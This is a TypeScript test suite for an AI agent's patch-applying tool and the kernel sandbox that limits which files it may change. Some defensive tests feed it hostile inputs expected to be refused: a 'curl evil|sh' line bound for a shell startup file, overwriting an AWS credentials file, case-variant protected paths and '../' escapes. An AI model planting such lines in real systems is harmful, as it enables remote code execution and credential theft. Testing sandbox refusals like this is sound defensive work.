// @covers task-sandbox.apply-patch
// @level integration
import { spawnSync } from "node:child_process";
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import { applyHunks, applyPatch, createApplyPatchToolDefinition, parsePatch, type PatchFileOperations } from "./apply-patch.ts";
import { createTaskFileOperations } from "./files.ts";
import type { SandboxPermissions } from "../sandbox-core/index.ts";

const macKernel = process.platform === "darwin" && existsSync("/usr/bin/sandbox-exec") &&
    spawnSync("/usr/bin/sandbox-exec", ["-p", "(version 1)(allow default)", "/usr/bin/true"]).status === 0;
const linuxKernel = process.platform === "linux" &&
    spawnSync("bwrap", ["--ro-bind", "/", "/", "--", "/bin/true"]).status === 0;
const kernel = macKernel || linuxKernel;
if (process.env.PI_SANDBOX_REQUIRE_BACKEND === "macos-seatbelt" && !macKernel) {
    throw new Error("Real macOS Seatbelt kernel required but sandbox-exec cannot apply a profile");
}

const patch = (...body: string[]) => ["*** Begin Patch", ...body, "*** End Patch"].join("\n");

// ---- parser ------------------------------------------------------------------

test("parses every operation, move, anchors and End of File", () => {
    const actions = parsePatch(`\n${patch(
        "*** Add File: src/new.ts", "+export const a = 1;", "+",
        "*** Update File: src/old.ts", "*** Move to: src/moved.ts", "@@ function main() {", "-  old();", "+  next();", "*** End of File",
        "*** Delete File: src/gone.ts",
    )}\n`);
    assert.deepEqual(actions, [
        { kind: "add", path: "src/new.ts", lines: ["export const a = 1;", ""] },
        { kind: "update", path: "src/old.ts", moveTo: "src/moved.ts",
            hunks: [{ anchor: "function main() {", lines: ["-  old();", "+  next();"], endOfFile: true }] },
        { kind: "delete", path: "src/gone.ts" },
    ]);
});

test("a bare empty line is context, and trailing separators are dropped", () => {
    const [action] = parsePatch(patch("*** Update File: a.txt", "@@", " one", "", "-two", "+TWO", "", "*** Delete File: b.txt"));
    assert.equal(action!.kind, "update");
    assert.deepEqual(action!.kind === "update" && action!.hunks[0]!.lines, [" one", " ", "-two", "+TWO"]);
});

test("an added file keeps inner empty lines and drops trailing separators", () => {
    assert.deepEqual(parsePatch(patch("*** Add File: a.txt", "+one", "", "+three", "", "", "*** Delete File: b.txt")),
        [{ kind: "add", path: "a.txt", lines: ["one", "", "three"] }, { kind: "delete", path: "b.txt" }]);
});

test("rejects malformed patches with the offending line", () => {
    assert.throws(() => parsePatch(""), /non-empty patch/);
    assert.throws(() => parsePatch("*** Update File: a\n*** End Patch"), /must start with/);
    assert.throws(() => parsePatch("*** Begin Patch\n*** Add File: a\n+x"), /must end with/);
    assert.throws(() => parsePatch(patch("*** Add File: a", "x")), /Line 3: every line of an added file starts with '\+'/);
    assert.throws(() => parsePatch(patch("*** Update File: a", "@@", "?x")), /Line 4: hunk lines start with/);
    assert.throws(() => parsePatch(patch("*** Update File: a")), /has no changes/);
    assert.throws(() => parsePatch(patch("*** Frobnicate: a")), /expected '\*\*\* Add File:'/);
    assert.throws(() => parsePatch(patch()), /no file operations/);
    assert.throws(() => parsePatch(patch("*** Delete File: a") + "\ntrailing"), /Text after/);
});

// ---- hunks -------------------------------------------------------------------

test("hunks match in order, honour anchors and End of File, and keep CRLF", () => {
    const text = "a\nb\nc\nb\nend\n";
    assert.equal(applyHunks(text, [{ anchor: "c", lines: ["-b", "+B"], endOfFile: false }], "f"), "a\nb\nc\nB\nend\n");
    assert.equal(applyHunks(text, [{ lines: [" b", "+x"], endOfFile: false }, { lines: [" b", "+y"], endOfFile: false }], "f"), "a\nb\nx\nc\nb\ny\nend\n");
    assert.equal(applyHunks(text, [{ lines: ["-end", "+END"], endOfFile: true }], "f"), "a\nb\nc\nb\nEND\n");
    assert.equal(applyHunks("x\r\ny\r\n", [{ lines: ["-y", "+z"], endOfFile: false }], "f"), "x\r\nz\r\n");
    assert.equal(applyHunks("no newline", [{ lines: ["-no newline", "+still none"], endOfFile: false }], "f"), "still none");
    assert.equal(applyHunks("a\n", [{ lines: ["+b"], endOfFile: false }], "f"), "a\nb\n", "pure insertion appends");
    // Whitespace and typographic punctuation are tolerated after an exact match fails.
    assert.equal(applyHunks("  call(\"x\") \n", [{ lines: ["-call(“x”)", "+call(\"y\")"], endOfFile: false }], "f"), "call(\"y\")\n");
    assert.throws(() => applyHunks(text, [{ lines: ["-missing"], endOfFile: false }], "f"), /hunk 1 of f: the context\/removed lines were not found/);
    assert.throws(() => applyHunks(text, [{ anchor: "nope", lines: ["-b"], endOfFile: false }], "f"), /could not find the '@@ nope' line/);
});

// ---- applying with in-memory operations --------------------------------------

function memory(files: Record<string, string>, fail?: (op: string, path: string) => boolean) {
    const disk = new Map(Object.entries(files));
    const log: string[] = [];
    const guard = (op: string, path: string) => {
        if (fail?.(op, path)) throw new Error(`injected ${op} failure`);
    };
    const ops: PatchFileOperations = {
        async readFile(path) {
            const content = disk.get(path);
            if (content === undefined) throw Object.assign(new Error("ENOENT"), { code: "ENOENT" });
            return Buffer.from(content);
        },
        async writeFile(path, content) { guard("write", path); log.push(`write ${path}`); disk.set(path, content); },
        async mkdir(path) { log.push(`mkdir ${path}`); },
        async remove(path) { guard("remove", path); log.push(`remove ${path}`); disk.delete(path); },
        checkWrite(path) { guard("check-write", path); },
        checkRemove(path) { guard("check-remove", path); },
    };
    return { disk, log, ops };
}

test("applies add, update, move and delete, writing each file once", async () => {
    const m = memory({ "/w/a.txt": "one\ntwo\n", "/w/b.txt": "move me\n", "/w/c.txt": "bye\n" });
    const result = await applyPatch(patch(
        "*** Add File: new/d.txt", "+hello",
        "*** Update File: a.txt", "@@", " one", "-two", "+TWO",
        "*** Update File: b.txt", "*** Move to: moved/b.txt", "@@", "-move me", "+moved",
        "*** Delete File: c.txt",
    ), "/w", m.ops);
    assert.deepEqual(Object.fromEntries(m.disk), { "/w/a.txt": "one\nTWO\n", "/w/new/d.txt": "hello\n", "/w/moved/b.txt": "moved\n" });
    assert.deepEqual(result.changes.map((change) => change.kind), ["add", "update", "move", "delete"]);
    assert.match(result.summary, /add new\/d.txt, update a.txt, update b.txt → moved\/b.txt, delete c.txt/);
    // Removals run last, so a failure part-way never loses content first.
    assert.deepEqual(m.log.filter((line) => line.startsWith("remove")), ["remove /w/b.txt", "remove /w/c.txt"]);
    assert.ok(m.log.indexOf("remove /w/b.txt") > m.log.indexOf("write /w/moved/b.txt"));
});

test("validation failure anywhere changes nothing", async () => {
    const m = memory({ "/w/a.txt": "one\n", "/w/b.txt": "two\n" });
    await assert.rejects(applyPatch(patch(
        "*** Update File: a.txt", "-one", "+ONE",
        "*** Update File: b.txt", "-three", "+THREE",
    ), "/w", m.ops), /rejected \(update b.txt\): hunk 1 of b.txt.*Nothing was changed/s);
    await assert.rejects(applyPatch(patch("*** Delete File: missing.txt"), "/w", m.ops), /missing.txt does not exist/);
    await assert.rejects(applyPatch(patch("*** Update File: missing.txt", "+x"), "/w", m.ops), /missing.txt does not exist/);
    const refused = memory({ "/w/a.txt": "one\n" }, (op, path) => op === "check-remove" && path === "/w/a.txt");
    await assert.rejects(applyPatch(patch("*** Add File: n.txt", "+n", "*** Delete File: a.txt"), "/w", refused.ops), /injected check-remove failure/);
    assert.deepEqual(m.log, []);
    assert.deepEqual(refused.log, []);
});

test("a failure during writes restores applied files and reports exactly what happened", async () => {
    const m = memory({ "/w/a.txt": "one\n", "/w/b.txt": "two\n", "/w/c.txt": "three\n" }, (op, path) => op === "write" && path === "/w/b.txt");
    await assert.rejects(applyPatch(patch(
        "*** Update File: a.txt", "-one", "+ONE",
        "*** Update File: b.txt", "-two", "+TWO",
        "*** Delete File: c.txt",
    ), "/w", m.ops), (error: Error) => {
        assert.match(error.message, /failed to write \/w\/b.txt: injected write failure/);
        assert.match(error.message, /Applied then restored: \/w\/a.txt\./);
        assert.match(error.message, /Still applied \(could not restore\): none\./);
        assert.match(error.message, /Not applied: write \/w\/b.txt, remove \/w\/c.txt\./);
        return true;
    });
    assert.deepEqual(Object.fromEntries(m.disk), { "/w/a.txt": "one\n", "/w/b.txt": "two\n", "/w/c.txt": "three\n" });
});

test("an added file that cannot be removed again is reported as still applied", async () => {
    const m = memory({ "/w/a.txt": "one\n" }, (op, path) => (op === "write" && path === "/w/a.txt") || (op === "remove" && path === "/w/new.txt"));
    await assert.rejects(applyPatch(patch("*** Add File: new.txt", "+n", "*** Update File: a.txt", "-one", "+ONE"), "/w", m.ops),
        /Still applied \(could not restore\): created \/w\/new.txt \(injected remove failure\)/);
    assert.equal(m.disk.get("/w/a.txt"), "one\n", "no file is half-applied");
});

test("the tool definition matches the Codex schema and serializes on every target", async () => {
    const m = memory({ "/w/a.txt": "one\n" });
    const queued: string[] = [];
    const tool = createApplyPatchToolDefinition("/w", m.ops, async (path, fn) => { queued.push(path); return fn(); });
    assert.equal(tool.name, "apply_patch");
    assert.deepEqual(tool.parameters.required, ["input"]);
    assert.deepEqual(Object.keys(tool.parameters.properties), ["input"]);
    const result = await tool.execute("id", { input: patch("*** Update File: a.txt", "*** Move to: b.txt", "-one", "+two") });
    assert.deepEqual(queued, ["/w/a.txt", "/w/b.txt"]);
    assert.match(result.content[0]!.text, /Files changed: 1/);
    await assert.rejects(tool.execute("id", {}), /requires an `input` string/);
});

// ---- the real guarded operations, under the kernel sandbox --------------------

function kernelFixture(permissions: Partial<SandboxPermissions>, parent = tmpdir()) {
    const base = realpathSync(mkdtempSync(join(parent, "apply-patch-")));
    const root = join(base, "project"), home = join(base, "home");
    mkdirSync(join(root, ".worktrees", "wt"), { recursive: true });
    mkdirSync(join(home, ".aws"), { recursive: true });
    writeFileSync(join(root, "keep.txt"), "keep\n");
    writeFileSync(join(root, "edit.txt"), "old\n");
    writeFileSync(join(root, ".worktrees", "wt", "scratch.txt"), "scratch\n");
    writeFileSync(join(home, ".aws", "credentials"), "secret\n");
    const plan = { confined: true as const, profilePath: join(base, "profile.sb"), policy: {
        writableRoot: root, home, denyWrite: [join(root, ".pi")],
        permissions: { projectFiles: "read-write", outsideProject: "read", storedCredentials: "read", commands: false, network: false, ...permissions } as SandboxPermissions,
    } };
    const files = createTaskFileOperations({ requireLaunchPlan: () => plan });
    const ops: PatchFileOperations = { readFile: files.read.readFile, writeFile: files.write.writeFile, mkdir: files.write.mkdir,
        remove: files.remove.remove, checkWrite: files.check.write, checkRemove: files.check.remove };
    return { base, root, home, ops, cleanup: () => rmSync(base, { recursive: true, force: true }) };
}

test("Project files = Write: edits apply, deletes and moves are refused outside worktree folders", { skip: !kernel }, async () => {
    const f = kernelFixture({ projectFiles: "write" });
    try {
        if (process.platform === "linux") {
            // Bubblewrap cannot separate removal from writing, so Linux refuses Project files = Write (ADR 0008).
            await assert.rejects(applyPatch(patch("*** Update File: edit.txt", "-old", "+new"), f.root, f.ops), /cannot separate removal from writing/);
            assert.equal(readFileSync(join(f.root, "edit.txt"), "utf8"), "old\n");
            return;
        }
        await applyPatch(patch("*** Update File: edit.txt", "-old", "+new", "*** Add File: added.txt", "+added"), f.root, f.ops);
        assert.equal(readFileSync(join(f.root, "edit.txt"), "utf8"), "new\n");
        assert.equal(readFileSync(join(f.root, "added.txt"), "utf8"), "added\n");
        await assert.rejects(applyPatch(patch("*** Add File: other.txt", "+x", "*** Delete File: keep.txt"), f.root, f.ops),
            /rejected \(delete keep.txt\): Task sandbox refused to remove .*keep.txt: delete-denied/);
        await assert.rejects(applyPatch(patch("*** Update File: edit.txt", "*** Move to: renamed.txt"), f.root, f.ops), /delete-denied/);
        assert.equal(readFileSync(join(f.root, "keep.txt"), "utf8"), "keep\n");
        assert.equal(existsSync(join(f.root, "other.txt")), false, "a refused patch changes nothing");
        assert.equal(existsSync(join(f.root, "renamed.txt")), false);
        // Worktree folders are disposable: removal is allowed there.
        await applyPatch(patch("*** Delete File: .worktrees/wt/scratch.txt"), f.root, f.ops);
        assert.equal(existsSync(join(f.root, ".worktrees", "wt", "scratch.txt")), false);
    } finally { f.cleanup(); }
});

test("Outside project = Write: delete in temp is allowed, delete elsewhere in home is refused", { skip: !kernel || process.platform === "win32" }, async () => {
    // A home outside every temp root, or temp's own disposability would prove nothing.
    const f = kernelFixture({ outsideProject: "write" }, fileURLToPath(new URL(".", import.meta.url)));
    const temporary = realpathSync(mkdtempSync(join(tmpdir(), "apply-patch-temp-")));
    try {
        mkdirSync(join(f.home, "projects", "other"), { recursive: true });
        writeFileSync(join(f.home, "projects", "other", "README.md"), "keep me\n");
        writeFileSync(join(temporary, "junk.txt"), "junk\n");
        await applyPatch(patch(`*** Delete File: ${join(temporary, "junk.txt")}`), f.root, f.ops);
        assert.equal(existsSync(join(temporary, "junk.txt")), false);
        // Linux's fallback keeps ordinary home folders read-only instead (ADR 0008).
        await assert.rejects(applyPatch(patch(`*** Delete File: ${join(f.home, "projects", "other", "README.md")}`), f.root, f.ops),
            process.platform === "linux" ? /permission-denied/ : /delete-denied/);
        assert.equal(readFileSync(join(f.home, "projects", "other", "README.md"), "utf8"), "keep me\n");
        if (process.platform === "linux") return;
        await applyPatch(patch(`*** Update File: ${join(f.home, "projects", "other", "README.md")}`, "-keep me", "+edited in place"), f.root, f.ops);
        assert.equal(readFileSync(join(f.home, "projects", "other", "README.md"), "utf8"), "edited in place\n");
    } finally { f.cleanup(); rmSync(temporary, { recursive: true, force: true }); }
});

test("credential files and paths outside the workspace under Outside = Read are refused", { skip: !kernel }, async () => {
    const f = kernelFixture({ outsideProject: "read-write", storedCredentials: "read" });
    try {
        await assert.rejects(applyPatch(patch(`*** Update File: ${join(f.home, ".aws", "credentials")}`, "-secret", "+stolen"), f.root, f.ops),
            /Task sandbox refused to write .*credentials: permission-denied/);
        assert.equal(readFileSync(join(f.home, ".aws", "credentials"), "utf8"), "secret\n");
    } finally { f.cleanup(); }
    const r = kernelFixture({ outsideProject: "read" });
    try {
        await assert.rejects(applyPatch(patch(`*** Add File: ${join(r.base, "outside.txt")}`, "+no"), r.root, r.ops),
            /Task sandbox refused to write .*outside.txt: permission-denied/);
        await assert.rejects(applyPatch(patch("*** Add File: ../escape.txt", "+no"), r.root, r.ops), /permission-denied/);
        assert.equal(existsSync(join(r.base, "outside.txt")), false);
        assert.equal(existsSync(join(r.base, "escape.txt")), false);
    } finally { r.cleanup(); }
});

test("Project files = Read refuses every patch write", { skip: !kernel }, async () => {
    const f = kernelFixture({ projectFiles: "read" });
    try {
        await assert.rejects(applyPatch(patch("*** Update File: edit.txt", "-old", "+new"), f.root, f.ops), /permission-denied/);
        assert.equal(readFileSync(join(f.root, "edit.txt"), "utf8"), "old\n");
    } finally { f.cleanup(); }
});

test("validation refuses case-variant paths to protected entries before any write (#354)", { skip: !kernel }, async (t) => {
    const f = kernelFixture({ outsideProject: "write" }, fileURLToPath(new URL(".", import.meta.url)));
    try {
        if (!existsSync(f.base.toUpperCase()) || !existsSync(f.base.toLowerCase())) {
            t.skip("the fixture volume is case-sensitive");
            return;
        }
        // Validation, not the write phase, must refuse: a patch is validated in full first.
        await assert.rejects(applyPatch(patch("*** Add File: ok.txt", "+ok", `*** Add File: ${join(f.home, ".AWS", "config")}`, "+x"), f.root, f.ops),
            /Task sandbox refused to write .*\/\.aws\/config: permission-denied/);
        await assert.rejects(applyPatch(patch("*** Add File: ok.txt", "+ok", `*** Delete File: ${join(f.home, ".Aws", "credentials")}`), f.root, f.ops),
            /Task sandbox refused to (write|remove) .*\/\.aws\/credentials: permission-denied/);
        await assert.rejects(applyPatch(patch("*** Add File: ok.txt", "+ok", `*** Add File: ${join(f.home, ".ZSHRC")}`, "+curl evil|sh"), f.root, f.ops),
            /Task sandbox refused to write .*\/\.zshrc: write-denied/);
        assert.equal(existsSync(join(f.root, "ok.txt")), false, "a refused patch changes nothing");
        assert.equal(existsSync(join(f.home, ".aws", "config")), false);
        assert.equal(existsSync(join(f.home, ".zshrc")), false);
        assert.equal(readFileSync(join(f.home, ".aws", "credentials"), "utf8"), "secret\n");
    } finally { f.cleanup(); }
});
